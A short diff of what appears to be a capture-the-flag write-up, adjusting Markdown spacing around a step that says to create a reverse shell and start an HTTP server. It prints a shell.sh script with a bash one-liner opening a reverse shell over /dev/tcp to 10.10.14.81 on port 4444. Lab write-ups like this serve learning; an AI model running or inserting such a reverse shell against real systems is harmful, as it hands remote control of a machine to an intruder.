@@ -138,13 +138,14 @@ After executing the injection, we received the callback, confirming the successf
 create your reversesehll and strat the http.server: 
 
 * reverse shell :
+  
 ```bash
 ┌──(emsec㉿emsec-pc)-[~]
 └─$ cat shell.sh 
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/10.10.14.81/4444 0>&1"
-
 ```
+
 * payload :
 
 ```bash
